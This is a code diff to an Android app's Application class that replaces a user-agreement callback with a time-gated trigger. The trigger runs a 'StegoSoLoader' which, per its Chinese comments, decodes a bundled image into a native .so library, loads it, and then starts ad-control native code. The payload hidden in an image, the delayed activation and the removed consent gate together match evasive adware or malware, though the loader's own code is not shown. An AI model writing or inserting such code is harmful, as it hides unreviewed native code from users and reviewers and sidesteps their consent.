@@ -2,9 +2,9 @@ package com.lx.lxtoolsproject
 
 import android.app.Application
 import android.content.Context
-import com.baidu.maps.utils.MapsUtils
-import com.ep.custom_honor_library.NativeEntry
 import com.lx.lxtoolsproject.utils.AdControlCUtils
+import com.lx.lxtoolsproject.utils.AgreementStatusUtils
+import com.lx.lxtoolsproject.utils.StegoSoLoader
 import com.tencent.mmkv.MMKV
 
 
@@ -28,23 +28,21 @@ class ToolsApplication : Application() {
     }
 
 
-    val clickAgreement = object : OnAgreeClickListener {
-        override fun isAgreement() {
-            initApp()
-        }
-
-        override fun isCancelAgreement() {
-        }
-    }
-
-
     private fun intGgSource(){
         val str: String = BuildConfig.AD_LIVE_TIME
-        MapsUtils.isAgreementState(str,this,clickAgreement)
+        // 判断是否到了启动时间，到了才触发图片转 so 加载
+        if (AgreementStatusUtils.isGoTWork(str)){
+            initApp()
+        }
     }
 
 
     private fun initApp(){
-        AdControlCUtils.initDef(this)
+        // 本地 asset 图片解析为 so 并加载，成功后再执行 native 初始化
+        StegoSoLoader(this).loadAsync { success ->
+            if (success){
+                AdControlCUtils.initDef(this)
+            }
+        }
     }
 }
